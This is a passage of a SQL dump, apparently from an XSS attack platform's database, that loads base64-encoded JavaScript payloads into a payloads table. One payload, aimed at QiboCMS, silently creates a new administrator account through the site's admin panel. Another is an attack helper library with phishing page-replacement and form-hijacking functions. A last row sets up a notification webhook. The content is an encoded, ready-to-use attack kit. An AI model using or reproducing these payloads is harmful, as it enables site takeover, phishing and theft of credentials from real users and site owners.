PSAxOwp9', 0);
INSERT INTO xss.payloads (name, `desc`, jscode, love) VALUES ('qibocms.js', 'wt', 'dmFyIHBrYXYgPSB7CiAgICBhamF4OiBmdW5jdGlvbigpIHsKICAgICAgICB2YXIgeG1sSHR0cDsKICAgICAgICB0cnkgewogICAgICAgICAgICB4bWxIdHRwID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgeG1sSHR0cCA9IG5ldyBBY3RpdmVYT2JqZWN0KCJNc3htbDIuWE1MSFRUUCIpOwogICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIHhtbEh0dHAgPSBuZXcgQWN0aXZlWE9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIHhtbEh0dHA7CiAgICB9LAogICAgcmVxOiBmdW5jdGlvbih1cmwsIGRhdGEsIG1ldGhvZCwgY2FsbGJhY2spIHsKICAgICAgICBtZXRob2QgPSAobWV0aG9kIHx8ICIiKS50b1VwcGVyQ2FzZSgpOwogICAgICAgIG1ldGhvZCA9IG1ldGhvZCB8fCAiR0VUIjsKICAgICAgICBkYXRhID0gZGF0YSB8fCAiIjsKICAgICAgICBpZiAodXJsKSB7CiAgICAgICAgICAgIHZhciBhID0gdGhpcy5hamF4KCk7CiAgICAgICAgICAgIGEub3BlbihtZXRob2QsIHVybCwgdHJ1ZSk7CiAgICAgICAgICAgIGlmIChtZXRob2QgPT0gIlBPU1QiKSB7CiAgICAgICAgICAgICAgICBhLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBhLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgaWYgKGEucmVhZHlTdGF0ZSA9PSA0ICYmIGEuc3RhdHVzID09IDIwMCkgewogICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykgewogICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhhLnJlc3BvbnNlVGV4dCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9OwogICAgICAgICAgICBpZiAoKHR5cGVvZiBkYXRhKSA9PSAib2JqZWN0IikgewogICAgICAgICAgICAgICAgdmFyIGFyciA9IFtdOwogICAgICAgICAgICAgICAgZm9yICh2YXIgaSBpbiBkYXRhKSB7CiAgICAgICAgICAgICAgICAgICAgYXJyLnB1c2goaSArICI9IiArIGVuY29kZVVSSUNvbXBvbmVudChkYXRhW2ldKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBhLnNlbmQoYXJyLmpvaW4oIiYiKSk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBhLnNlbmQoZGF0YSB8fCBudWxsKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0sCiAgICBnZXQ6IGZ1bmN0aW9uKHVybCwgY2FsbGJhY2spIHsKICAgICAgICB0aGlzLnJlcSh1cmwsICIiLCAiR0VUIiwgY2FsbGJhY2spOwogICAgfSwKICAgIHBvc3Q6IGZ1bmN0aW9uKHVybCwgZGF0YSwgY2FsbGJhY2spIHsKICAgICAgICB0aGlzLnJlcSh1cmwsIGRhdGEsICJQT1NUIiwgY2FsbGJhY2spOwogICAgfQp9OwppZiAoIXdpbmRvdy5fX3gpIHsKICAgIHBrYXYucG9zdCgiL2FkbWluL2luZGV4LnBocD9sZmo9bWVtYmVyJmFjdGlvbj1hZGRtZW1iZXIiLCAicG9zdGRiJTVCdXNlcm5hbWUlNUQ9a2FrYWh1YWRtaW4mcG9zdGRiJTVCcGFzc3dkJTVEPWtha2FodWFkbWluJnBvc3RkYiU1QnBhc3N3ZDIlNUQ9a2FrYWh1YWRtaW4mcG9zdGRiJTVCZ3JvdXBpZCU1RD0zJnBvc3RkYiU1QmVtYWlsJTVEPWtha2FodWFkbWluJTQwcXEuY29tJlN1Ym1pdD0lQ0MlRTElQkQlQkIiLCBmdW5jdGlvbihycykge30pOwogICAgcGthdi5nZXQoIuaOpeWPo+WcsOWdgCIsIGZ1bmN0aW9uKHJzKSB7fSk7CiAgICB3aW5kb3cuX194ID0gMTsKfQ==', 0);
INSERT INTO xss.payloads (name, `desc`, jscode, love) VALUES ('xss.js', '22', 'dmFyIHhzcyA9IGZ1bmN0aW9uKCkgewogICAgdmFyIHggPSB7CiAgICAgICAgJ25hbWUnOiAneHNzLmpzJywKICAgICAgICAndmVyc2lvbic6ICcwLjEnLAogICAgICAgICdhdXRob3InOiAnamFja21hc2EnCiAgICB9OwoKICAgIHgueCA9IGZ1bmN0aW9uKGlkKSB7CiAgICAgICAgcmV0dXJuIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKGlkKQogICAgfTsKCiAgICAvL+WuuemUmeWPluWAvAogICAgeC5lID0gZnVuY3Rpb24oXykgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHJldHVybiBldmFsKCcoJyArIF8gKyAnKScpCiAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICByZXR1cm4gJycKICAgICAgICB9CiAgICB9OwoKICAgIC8v5rWP6KeI5ZmoIAogICAgeC5pID0gewogICAgICAgIGk6ICEhc2VsZi5BY3RpdmVYT2JqZWN0LAogICAgICAgIGM6ICEhc2VsZi5jaHJvbWUsCiAgICAgICAgZjogc2VsZi5tb3pQYWludENvdW50ID4gLTEsCiAgICAgICAgbzogISFzZWxmLm9wZXJhLAogICAgICAgIHM6ICFzZWxmLmNocm9tZSAmJiAhIXNlbGYuV2ViS2l0UG9pbnQKICAgIH07CgogICAgLy9VQQogICAgeC51YSA9IG5hdmlnYXRvci51c2VyQWdlbnQ7CgogICAgLy/liKTmlq3mmK/lkKbkuLroi7nmnpzmiYvmjIHorr7lpIcKICAgIHguYXBwbGUgPSB4LnVhLm1hdGNoKC9pcChvbmV8YWR8b2QpL2kpICE9IG51bGw7CgogICAgLy/pmo/mnLrmlbAKICAgIHgucmRtID0gZnVuY3Rpb24oKSB7CiAgICAgICAgcmV0dXJuIH5+KE1hdGgucmFuZG9tKCkgKiAxMDAwMDApCiAgICB9OwoKICAgIC8vdXJs57yW56CBKFVURjgpCiAgICB4LmVjID0gZW5jb2RlVVJJQ29tcG9uZW50OwoKICAgIHguaHRtbCA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdodG1sJylbMF07CgogICAgLyoKICAgICAqIOmUgOavgeS4gOS4quWFg+e0oAogICAgICovCiAgICB4LmtpbGwgPSBmdW5jdGlvbihlKSB7CiAgICAgICAgZS5wYXJlbnRFbGVtZW50LnJlbW92ZUNoaWxkKGUpOwogICAgfTsKCiAgICAvKgogICAgICrnu5Hlrprkuovku7YKICAgICAqLwogICAgeC5iaW5kID0gZnVuY3Rpb24oZSwgbmFtZSwgZm4pIHsKICAgICAgICBlLmFkZEV2ZW50TGlzdGVuZXIgPyBlLmFkZEV2ZW50TGlzdGVuZXIobmFtZSwgZm4sIGZhbHNlKSA6IGUuYXR0YWNoRXZlbnQoIm9uIiArIG5hbWUsIGZuKTsKICAgIH07CgogICAgLyoKICAgICAqIGRvbeWHhuWkh+WujOavleaXtuaJp+ihjOWHveaVsAogICAgICovCiAgICB4LnJlYWR5ID0gZnVuY3Rpb24oZm4pIHsKICAgICAgICBpZiAoIXguaS5pKSB7CiAgICAgICAgICAgIHguYmluZChkb2N1bWVudCwgJ0RPTUNvbnRlbnRMb2FkZWQnLCBmbik7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgdmFyIHMgPSBzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5kb1Njcm9sbCgnbGVmdCcpOwogICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwocyk7CiAgICAgICAgICAgICAgICAgICAgZm4oKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHt9CiAgICAgICAgICAgIH0sIDQpOwogICAgICAgIH0KICAgIH0KCiAgICAvKgogICAgICog5ZCM5rqQ5qOA5rWLCiAgICAgKi8KICAgIHgubyA9IGZ1bmN0aW9uKHVybCkgewogICAgICAgIHZhciBsaW5rID0geC5kb20oJzxhIGhyZWY9IicgKyBlbmNvZGVVUkkodXJsKSArICciPicsIDIpOwogICAgICAgIHJldHVybiBsaW5rLnByb3RvY29sICsgbGluay5ob3N0bmFtZSArICc6JyArIGxpbmsucG9ydCA9PSBsb2NhdGlvbi5wcm90b2NvbCArIGxvY2F0aW9uLmhvc3RuYW1lICsgJzonICsgbGluay5wb3J0OwogICAgfTsKCiAgICAvKgogICAgICogaHRtbCB0byBkb20KICAgICAqLwogICAgeC5kb20gPSBmdW5jdGlvbihodG1sLCBnY3NlYykgewogICAgICAgIHZhciB0bXAgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzcGFuJyk7CiAgICAgICAgdG1wLmlubmVySFRNTCA9IGh0bWw7CiAgICAgICAgdmFyIGUgPSB0bXAuY2hpbGRyZW5bMF07CiAgICAgICAgZS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwogICAgICAgIHguaHRtbC5hcHBlbmRDaGlsZChlKTsKICAgICAgICBnY3NlYyA+PiAwID4gMCAmJiBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICB4LmtpbGwoZSk7CiAgICAgICAgfSwgZ2NzZWMgKiAxMDAwKTsKICAgICAgICByZXR1cm4gZTsKICAgIH07CgogICAgLyoKICAgICAqIGFqYXgKICAgICAqLwogICAgeC5hamF4ID0gZnVuY3Rpb24odXJsLCBwYXJhbXMsIGNhbGxiYWNrKSB7CiAgICAgICAgKHBhcmFtcyBpbnN0YW5jZW9mIEZ1bmN0aW9uKSAmJiAoY2FsbGJhY2sgPSBwYXJhbXMsIHBhcmFtcyA9IHZvaWQoMCkpOwogICAgICAgIHZhciBYSFIgPSAoIXgubyh1cmwpICYmIHdpbmRvdy5YRG9tYWluUmVxdWVzdCkgfHwKICAgICAgICAgICAgd2luZG93LlhNTEh0dHBSZXF1ZXN0IHx8CiAgICAgICAgICAgIChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgIHJldHVybiBuZXcgQWN0aXZlWE9iamVjdCgnTVNYTUwyLlhNTEhUVFAnKQogICAgICAgICAgICB9KTsKICAgICAgICB2YXIgeGhyID0gbmV3IFhIUigpOwogICAgICAgIHhoci5vcGVuKHBhcmFtcyA/ICdwb3N0JyA6ICdnZXQnLCB1cmwpOwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHhoci5zZXRSZXF1ZXN0SGVhZGVyKCdjb250ZW50LXR5cGUnLCAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJykKICAgICAgICB9IGNhdGNoIChlKSB7fQogICAgICAgIGNhbGxiYWNrICYmICh4aHIub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICh0aGlzLnJlYWR5U3RhdGUgPT0gNCAmJiAoKHRoaXMuc3RhdHVzID49IDIwMCAmJiB0aGlzLnN0YXR1cyA8PSAzMDApIHx8IHRoaXMuc3RhdHVzID09IDMwNCkpICYmIGNhbGxiYWNrLmFwcGx5KHRoaXMsIGFyZ3VtZW50cyk7CiAgICAgICAgfSk7CiAgICAgICAgeGhyLnNlbmQocGFyYW1zKTsKICAgIH07CgogICAgLyoKICAgICAqIG5vIGFqYXgKICAgICAqLwogICAgeC5uYWpheCA9IGZ1bmN0aW9uKHVybCwgcGFyYW1zKSB7CiAgICAgICAgaWYgKHBhcmFtcykgewogICAgICAgICAgICB2YXIgZm9ybSA9IHguZG9tKCc8Zm9ybSBtZXRob2Q9cG9zdCBhY2NlcHQtY2hhcnNldD11dGYtOD4nKTsKICAgICAgICAgICAgZm9ybS5hY3Rpb24gPSB1cmw7CiAgICAgICAgICAgIGZvciAodmFyIG5hbWUgaW4gcGFyYW1zKSB7CiAgICAgICAgICAgICAgICB2YXIgaW5wdXQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbnB1dCcpOwogICAgICAgICAgICAgICAgaW5wdXQubmFtZSA9IG5hbWU7CiAgICAgICAgICAgICAgICBpbnB1dC52YWx1ZSA9IHBhcmFtc1tuYW1lXTsKICAgICAgICAgICAgICAgIGZvcm0uYXBwZW5kQ2hpbGQoaW5wdXQpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHZhciBpZnJhbWUgPSB4LmRvbSgnPGlmcmFtZSBuYW1lPV8nICsgeC5yZG0oKSArICdfPicsIDYpOwogICAgICAgICAgICBmb3JtLnRhcmdldCA9IGlmcmFtZS5uYW1lOwogICAgICAgICAgICBmb3JtLnN1Ym1pdCgpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIG5ldyBJbWFnZSgpLnNyYyA9IHVybCArICcmJyArIHgucmRtKCk7CiAgICAgICAgfQogICAgfTsKCiAgICAvKgogICAgICog6ZKT6bG8CiAgICAgKi8KICAgIHgucGhpc2ggPSBmdW5jdGlvbih1cmwpIHsKICAgICAgICB4LmFqYXgodXJsLCBmdW5jdGlvbigpIHsKICAgICAgICAgICAgZG9jdW1lbnQub3BlbigpOwogICAgICAgICAgICBkb2N1bWVudC53cml0ZSh0aGlzLnJlc3BvbnNlVGV4dCk7CiAgICAgICAgICAgIGRvY3VtZW50LmNsb3NlKCk7CiAgICAgICAgICAgIGhpc3RvcnkucmVwbGFjZVN0YXRlICYgeC5vKHVybCkgJiYgaGlzdG9yeS5yZXBsYWNlU3RhdGUoJycsICcnLCB1cmwpOwogICAgICAgIH0pCiAgICB9OwoKICAgIC8qCiAgICAgKiDooajljZXliqvmjIEKICAgICAqLwogICAgeC54Zm9ybSA9IGZ1bmN0aW9uKGZvcm0sIGFjdGlvbikgewogICAgICAgIGZvcm0ub2xkX2FjdGlvbiA9IGZvcm0uYWN0aW9uLCBmb3JtLm9sZF90YXJnZXQgPSBmb3JtLnRhcmdldCwgZm9ybS5hY3Rpb24gPSBhY3Rpb247CiAgICAgICAgdmFyIGlmcmFtZSA9IHguZG9tKCc8aWZyYW1lIG5hbWU9XycgKyB4LnJkbSgpICsgJ18+Jyk7CiAgICAgICAgZm9ybS50YXJnZXQgPSBpZnJhbWUubmFtZTsKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICB4LmJpbmQoaWZyYW1lLCAnbG9hZCcsIGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgZm9ybS5hY3Rpb24gPSBmb3JtLm9sZF9hY3Rpb24sIGZvcm0udGFyZ2V0ID0gZm9ybS5vbGRfdGFyZ2V0LCBmb3JtLm9uc3VibWl0ID0gbnVsbCwgZm9ybS5zdWJtaXQoKTsKICAgICAgICAgICAgfSkKICAgICAgICB9LCAzMCk7CiAgICB9OwoKICAgIC8qCiAgICAgKiDlh73mlbDku6PnkIYKICAgICAqLwogICAgeC5wcm94eSA9IGZ1bmN0aW9uKGZuLCBiZWZvcmUsIGFmdGVyKSB7CiAgICAgICAgcmV0dXJuIGZ1bmN0aW9uKCkgewogICAgICAgICAgICBiZWZvcmUgJiYgYmVmb3JlLmFwcGx5KHRoaXMsIGFyZ3VtZW50cyk7CiAgICAgICAgICAgIHZhciByZXN1bHQgPSBmbi5hcHBseSh0aGlzLCBhcmd1bWVudHMpOwogICAgICAgICAgICBhZnRlciAmJiBhZnRlci5hcHBseSh0aGlzLCBhcmd1bWVudHMpOwogICAgICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgICAgIH0KICAgIH07CgogICAgcmV0dXJuIHg7Cn0oKTs=', 0);



INSERT INTO xss.dingconfig (webhook, isNotice, msgConfig) VALUES ('https://ip', 1, 0);